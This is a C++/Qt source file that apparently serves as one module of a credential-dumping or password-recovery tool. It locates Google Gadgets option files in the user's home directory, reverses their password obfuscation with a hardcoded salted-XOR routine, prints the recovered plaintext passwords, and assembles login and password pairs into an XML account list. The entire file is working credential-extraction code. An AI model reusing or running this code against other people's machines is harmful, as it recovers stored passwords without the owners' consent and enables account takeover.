#include "ggadgets.h"

#include <QDebug>
#include <QStringList>


#include "common.h"



int Compute(char salt1, char salt2, const char *input, size_t input_size, std::string *output) {
    int x = salt1 * 30103 + salt2 * 70607;
    for (size_t i = 0; i < input_size; i++) {
        output->append(1, static_cast<char>(input[i] ^ (x >> 16)));
        x = x * 275604541 + 15485863;
    }
    return x;
}

bool Decrypt(const std::string &input, std::string *output) {
    output->clear();

    if (input.size() < 3)
        return false;

    int x = Compute(input[0], input[1], input.c_str() + 2, input.size() - 3, output);
    if (input[input.size() - 1] != static_cast<char>(x)) {
        output->clear();
        return false;
    }
    return true;
}


std::string UnescapeValue(const std::string &input) {
    std::string result;
    result.reserve(input.size());
    for (size_t i = 0; i < input.size(); i++) {
        char c = input[i];
        if (c == '=' && i < input.size() - 2) {
            unsigned int t;
            sscanf(input.c_str() + i + 1, "%02X", &t);
            c = static_cast<char>(t);
            i += 2;
        }
        result.append(1, c);
    }
    return result;
}

ggadgets::ggadgets() {
    QString qqq = "=A3X=16Zq=E5=95=CDA=99U=0E/";
    std::string value_str = UnescapeValue(qqq.toStdString());
    std::string temp(value_str);
    Decrypt(temp, &value_str);
   // qDebug() << value_str.data();

    root = decoded.createElement("ggadgets");
    decoded.appendChild(root);
    findConfig();
}

QString ggadgets::decodePassword(QString hash) {
    QString result;
    std::string value_str = UnescapeValue(hash.toStdString());
    std::string temp(value_str);
    Decrypt(temp, &value_str);
    result = QString(value_str.data());
    return result;
}

void ggadgets::decoding(QFile &file){
    //qDebug() << file;
    QDomDocument doc;
        doc.setContent(&file);
        QDomElement root = doc.documentElement();
        QString login, pass;
            for (int i = 0; i<root.childNodes().count(); i++) {
                QDomElement temp = root.childNodes().at(i).toElement();
                if (temp.toElement().attribute("encrypted").toLower() == "1") {
                    if (temp.toElement().attribute("name").toLower() == "password") {
                        pass = decodePassword(temp.toElement().toElement().toText().data());
                        qDebug() << pass;
                    }
                }
            }
}

void ggadgets::createXML(QString login, QString pass){
    if (!login.isEmpty() && !pass.isEmpty()){
        QDomElement q = decoded.createElement("Account");
        root.appendChild(q);

        QDomElement tag = decoded.createElement("Login");
        q.appendChild(tag);
        QDomText t = decoded.createTextNode(login);
        tag.appendChild(t);

        tag = decoded.createElement("Password");
        q.appendChild(tag);
        t = decoded.createTextNode(pass);
        tag.appendChild(t);

    }
}

void ggadgets::findConfig(){
    QStringList gadgets;
    gadgets.append("gadget-*.xml");
    foreach(QString s, dirListFiles(homeDir()+".google/gadgets/options", gadgets)){
        QFile file(homeDir()+".google/gadgets/options/" + s);
        if (file.open(QIODevice::ReadOnly))
                decoding(file);
        }
}

ggadgets* ggadgets::instance() {
    if (!instance_)
        instance_ = new ggadgets();
    return instance_;
}

ggadgets* ggadgets::instance_ = NULL;
